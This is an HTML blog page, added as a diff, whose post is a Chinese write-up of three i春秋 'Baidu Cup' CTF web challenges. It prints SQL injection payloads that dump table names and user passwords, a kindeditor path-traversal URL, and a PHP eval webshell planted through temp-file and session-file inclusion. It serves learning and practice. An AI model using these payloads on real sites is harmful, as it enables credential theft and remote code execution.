@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="https://cuokon.github.io/live2d/autoload.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "23b069a1"
+    });
+  daovoice('update');
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="[“百度杯”CTF比赛 十二月场] Blog题目页面:注册用户,登入后再发布文章处发现了sql注入漏洞加了个’,发现插入失败在构造语句,发现插入成功,但是没有显示在文章页面上显示不到文章页面是因为,最后一个字段的因数,最后一个字段是记录用户名的,我这里创建的是test,变成test就可以插入成功了猜测的字段分别是id,标题,内容,用户名然后分别构造如下payload,得到admin密码表名 1ti">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="i春秋ctf(4)">
+<meta property="og:url" content="http://cuokon.github.com/2020/01/12/i春秋ctf(4)/index.html">
+<meta property="og:site_name" content="错空&#39;s Blog">
+<meta property="og:description" content="[“百度杯”CTF比赛 十二月场] Blog题目页面:注册用户,登入后再发布文章处发现了sql注入漏洞加了个’,发现插入失败在构造语句,发现插入成功,但是没有显示在文章页面上显示不到文章页面是因为,最后一个字段的因数,最后一个字段是记录用户名的,我这里创建的是test,变成test就可以插入成功了猜测的字段分别是id,标题,内容,用户名然后分别构造如下payload,得到admin密码表名 1ti">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/1-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/1-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/1-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/1-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/1-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/1-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/2-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/2-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/2-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/2-4_1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/2-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/3-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/3-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/3-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/3-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/3-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/3-6.png">
+<meta property="og:updated_time" content="2020-01-12T12:47:07.579Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="i春秋ctf(4)">
+<meta name="twitter:description" content="[“百度杯”CTF比赛 十二月场] Blog题目页面:注册用户,登入后再发布文章处发现了sql注入漏洞加了个’,发现插入失败在构造语句,发现插入成功,但是没有显示在文章页面上显示不到文章页面是因为,最后一个字段的因数,最后一个字段是记录用户名的,我这里创建的是test,变成test就可以插入成功了猜测的字段分别是id,标题,内容,用户名然后分别构造如下payload,得到admin密码表名 1ti">
+<meta name="twitter:image" content="http://cuokon.github.com/image/i%E6%98%A5%E7%A7%8Bctf(4)/1-1.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://cuokon.github.com/2020/01/12/i春秋ctf(4)/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>i春秋ctf(4) | 错空's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">错空's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学无止境</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://cuokon.github.com/2020/01/12/i春秋ctf(4)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cuo kon">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/43626445">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="错空's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">i春秋ctf(4)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-01-12 16:28:34 / 修改时间：20:47:07" itemprop="dateCreated datePublished" datetime="2020-01-12T16:28:34+08:00">2020-01-12</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习记录/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+		  
+		  
+          
+
+          <br>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">2.7k</span>
+            </span>
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">2 分钟</span>
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="“百度杯”CTF比赛-十二月场-Blog"><a href="#“百度杯”CTF比赛-十二月场-Blog" class="headerlink" title="[“百度杯”CTF比赛 十二月场] Blog"></a>[“百度杯”CTF比赛 十二月场] Blog</h2><p>题目页面:<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/1-1.png" alt="1-1"><br>注册用户,登入后再发布文章处发现了sql注入漏洞<br>加了个’,发现插入失败<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/1-2.png" alt="1-2"><br>在构造语句,发现插入成功,但是没有显示在文章页面上<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/1-3.png" alt="1-3"><br>显示不到文章页面是因为,最后一个字段的因数,最后一个字段是记录用户名的,我这里创建的是test,变成test就可以插入成功了<br>猜测的字段分别是<br><code>id,标题,内容,用户名</code><br>然后分别构造如下payload,得到admin密码<br>表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=test&amp;content=test&apos;,&apos;tesat&apos;),(&apos;test&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;222</span><br></pre></td></tr></table></figure>
+
+<p>列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=test&amp;content=test&apos;,&apos;tesat&apos;),(&apos;test&apos;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;),&apos;222</span><br></pre></td></tr></table></figure>
+
+<p>用户名密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=test&amp;content=test&apos;,&apos;tesat&apos;),(&apos;test&apos;,(select group_concat(username,password) from users),&apos;222</span><br></pre></td></tr></table></figure>
+
+<p>然后访问文章页面,就可以看到admin的密码了<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/1-4.png" alt="1-4"><br>md5解密得到<code>melody123</code>,然后访问文章的时候,看见url有点像文件包含,包含flag.php(flag.php会在robots.txt中看到)<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/1-5.png" alt="1-5"><br>得到base64加密的源码,解码得到flag<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/1-6.png" alt="1-6"></p>
+<h2 id="“百度杯”CTF比赛-十二月场-Blog·进阶篇"><a href="#“百度杯”CTF比赛-十二月场-Blog·进阶篇" class="headerlink" title="[“百度杯”CTF比赛 十二月场] Blog·进阶篇"></a>[“百度杯”CTF比赛 十二月场] Blog·进阶篇</h2><p>步骤和blog上面一样,先得到管理员密码<code>19-10-1997</code>,因为在他发布文章那里查看源码的时候发现是kindeditor编辑器<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/2-1.png" alt="2-1"><br>查了一下kindeditor编辑器的漏洞,发现有个列目录漏洞<br><code>http://878685f89f024d558bbd8e1183466b15962732e681794f5f.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../</code><br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/2-2.png" alt="2-2"><br>那这样就有思路了,因为有列目录漏洞我们可以看tmp目录下的文件内容,然后还有一个点就是我们主要文件上传那么久会生成一个临时文件,然后程序运行完成后就会删掉,因为程序速度够快所以一般难发现,还有就是这里还存在文件包含的漏洞,但是不可以用php://伪协议,如果我们自己包含自己,那么程序就会进入死循环,进入死循环,因为无限的包含我们的自己,会导致程序崩溃,无法删除我们的文件,做法<br>1.先写一个文件上传的代码,上传文件<br>2.然后利用kindeditor列目录漏洞去查看文件名<br>3.然后文件包含我们生成的临时文件,然后就可以getshell了</p>
+<p>第一个步文件上传</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"gbk"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://878685f89f024d558bbd8e1183466b15962732e681794f5f.changame.ichunqiu.com/blog_manage/manager.php?module=manager&amp;name=php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_GET[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>然后上传内容是我们的一句话木马,上传后就会一直转圆圈(过个10秒后就不会被删了),然后在去访问tmp的临时路径<br><code>http://878685f89f024d558bbd8e1183466b15962732e681794f5f.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../../../../../tmp/</code><br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/2-3.png" alt="2-3"><br>可以看到了上传的文件名,然后我们去包含此文件,然后传入一个phpinfo();<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/2-4_1.png" alt="2-4"><br>可以看见包含成功,然后去查看phpinfo();的时候看见禁用了系统执行函数,我们用show_source读取flag<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/2-5.png" alt="2-5"></p>
+<h2 id="“百度杯”CTF比赛-十二月场-notebook"><a href="#“百度杯”CTF比赛-十二月场-notebook" class="headerlink" title="[“百度杯”CTF比赛 十二月场]notebook"></a>[“百度杯”CTF比赛 十二月场]notebook</h2><p>题目页面:(题目有个小提示,用文件包含)<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/3-1.png" alt="3-1"><br>在查看robots.txt的时候那里有个php1nFo.php字符串,访问php1nFo.php是phpinfo()的内容,然后测试首页的文件包含,来尝试包含robots.txt文件试试<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/3-2.png" alt="3-2"><br>可以发现包含成功,因为session文件默认命名是sess_然后是此处会话的PHPSESSID。例如<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/3-3.png" alt="3-3"><br>我这里的session文件名就是<code>sess_k82v64s2oahgo5ea4a41c37036</code>,那就差路径了,这里简单讲讲坑,我们直接访问php1nFo.php查看里面的session.save_path,里面的<code>/var/lib/php5</code>其实是假的,他在登入页面会重新设置session的文件,所以我们用首页去包含php1nFo.php文件获取session路径<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/3-4.png" alt="3-4"><br>可以看见<code>/tmp/SESS</code>路径里面,然后我们的session的绝对路径是<code>/tmp/SESS/sess_k82v64s2oahgo5ea4a41c37036</code>,猜测用户名的值作为session存储的,那我们创建一个用户<code>&lt;?php eval($_GET[0]); ?&gt;</code>,登入后会记录session的值,然后我们就可以用文件包含去包含session文件<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/3-5.png" alt="3-5"><br>phpinfo执行成功,没有禁用系统执行函数,直接查看flag就可以了<br><img src="../../../../image/i%E6%98%A5%E7%A7%8Bctf(4)/3-6.png" alt="3-6"></p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+
+
+    
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>cuo kon</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://cuokon.github.com/2020/01/12/i春秋ctf(4)/" title="i春秋ctf(4)">http://cuokon.github.com/2020/01/12/i春秋ctf(4)/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/10/i春秋ctf(3)/" rel="next" title="i春秋ctf(3)">
+                <i class="fa fa-chevron-left"></i> i春秋ctf(3)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NTY1Ni8yMjE2Nw=="></div>
+  </div>
+  
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="https://avatars3.githubusercontent.com/u/43626445" alt="cuo kon">
+  
+  <p class="site-author-name" itemprop="name">cuo kon</p>
+  <div class="site-description motion-element" itemprop="description"></div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/cuokon" title="GitHub &rarr; https://github.com/cuokon" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:2804745224@qq.com" title="E-Mail &rarr; mailto:2804745224@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+
+  <div class="cc-license motion-element" itemprop="license">
+  
+  
+    
+  
+  
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fxnetw.com" title="https://www.fxnetw.com" rel="noopener" target="_blank">风雪's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://shadownb.github.io/" title="https://shadownb.github.io/" rel="noopener" target="_blank">shadow's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.lbx0726.com/" title="https://www.lbx0726.com/" rel="noopener" target="_blank">lbx0726's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://soyawww.github.io/" title="https://soyawww.github.io/" rel="noopener" target="_blank">soya's Blog</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#“百度杯”CTF比赛-十二月场-Blog"><span class="nav-number">1.</span> <span class="nav-text">[“百度杯”CTF比赛 十二月场] Blog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#“百度杯”CTF比赛-十二月场-Blog·进阶篇"><span class="nav-number">2.</span> <span class="nav-text">[“百度杯”CTF比赛 十二月场] Blog·进阶篇</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#“百度杯”CTF比赛-十二月场-notebook"><span class="nav-number">3.</span> <span class="nav-text">[“百度杯”CTF比赛 十二月场]notebook</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cuo kon</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">69k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">1:03</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
